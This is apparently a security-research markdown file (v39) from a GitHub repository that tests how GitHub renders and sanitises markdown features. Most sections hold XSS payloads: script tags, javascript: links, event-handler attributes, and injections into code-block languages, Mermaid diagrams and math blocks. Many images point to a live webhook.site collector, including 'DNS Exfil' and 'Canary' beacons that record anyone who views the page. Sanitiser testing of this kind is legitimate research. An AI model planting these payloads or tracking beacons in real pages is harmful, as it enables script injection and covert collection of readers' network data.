# Security Research - v39

## GitHub-Specific Features & Anchors

Testing GitHub-specific markdown features, relative links, and anchor behavior.

---

### 1) Relative URL Resolution

[Relative in repo](/test.svg)

[Relative with ../](../progsjessi/README.md)

[Relative to root](/jessi2000/progsjessi)

![Relative img](test.svg)

![Relative parent](../progsjessi/test.svg)

---

### 2) GitHub Anchor Links

[Jump to heading](#security-research---v39)

[Anchor with special chars](#1-relative-url-resolution)

[Non-existent anchor](#javascript:alert(1))

[Hash only](#)

<h2 id="custom-id">Custom ID Heading</h2>

[Link to custom ID](#custom-id)

<h2 id="javascript:alert(1)">JS in ID attempt</h2>

[Link to JS ID](#javascript:alert(1))

---

### 3) GitHub Flavored Markdown Extensions

#### Autolinks

Visit https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/autolink for info.

Email: test@8464777c-99e4-4c6a-9ae2-a591ce00730f.email.webhook.site

www.webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/www-autolink

#### Strikethrough

~~<script>alert('strikethrough')</script>~~

~~![strike-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/strike.gif)~~

#### Emoji

:smile: :+1: :rocket:

:javascript:: test

#### Mentions

@jessi2000 normal mention

@<script>alert(1)</script> script in mention

@javascript:alert(1) js in mention

#### Issue/PR References

#1 normal ref

#<script>alert(1)</script> script in ref

jessi2000/progsjessi#1 cross-repo ref

---

### 4) Table Advanced Features

| Column | With | Alignment |
|:-------|:----:|----------:|
| Left <script>xss</script> | Center ![](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/table-center.gif) | Right |
| [Link](javascript:alert(1)) | **Bold** | *Italic* |
| `code` | ~~strike~~ | normal |

---

### 5) Code Block Language Injection

```javascript<script>alert(1)</script>
const x = 1;
```

```<img src="https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/lang-img.gif">
some code
```

```javascript" onclick="alert(1)
let y = 2;
```

---

### 6) Inline Code Injection

`<script>alert(1)</script>`

`![img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/inline-code.gif)`

``double `backtick` test``

---

### 7) Alert/Note Blocks (GFM)

> [!NOTE]
> This is a note <script>alert(1)</script>
> ![note-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/note.gif)

> [!WARNING]
> This is a warning [click](javascript:alert(1))

> [!IMPORTANT]
> Important info ![important](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/important.gif)

---

### 8) Collapsed Sections

<details>
<summary>Click to expand <script>alert(1)</script></summary>

![details-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/details.gif)

<script>alert('inside details')</script>

[evil link](javascript:alert(1))

</details>

<details open ontoggle="alert(1)">
<summary onclick="alert(1)">Auto-expanded</summary>
Content here
</details>

---

### 9) Keyboard Tags

<kbd>Ctrl</kbd>+<kbd><script>alert(1)</script></kbd>

<kbd onclick="alert(1)">Click me</kbd>

<kbd><a href="javascript:alert(1)">JS Link</a></kbd>

<kbd><img src="https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/kbd-img.gif"></kbd>

---

### 10) Abbreviations/Definitions

*[HTML]: <script>alert('abbr')</script>
*[CSS]: ![abbr-img](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/abbr.gif)

HTML and CSS are technologies.

---

### 11) Math Blocks (if supported)

$x = y$ inline math

$$
\text{<script>alert(1)</script>}
$$

$$
\href{javascript:alert(1)}{click}
$$

---

### 12) Mermaid Diagrams (if supported)

```mermaid
graph TD
    A[<script>alert(1)</script>] --> B[Normal]
    B --> C{Decision}
    click A "javascript:alert(1)" "XSS Attempt"
```

---

### 13) Video Embed Syntax (if supported)

https://github.com/user-attachments/assets/video.mp4

https://www.youtube.com/watch?v=<script>alert(1)</script>

---

### DNS Exfil

![dns](https://v39-dns.8464777c-99e4-4c6a-9ae2-a591ce00730f.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/8464777c-99e4-4c6a-9ae2-a591ce00730f/v39-canary.gif)

---

*v39 - GitHub-specific features & anchor testing*
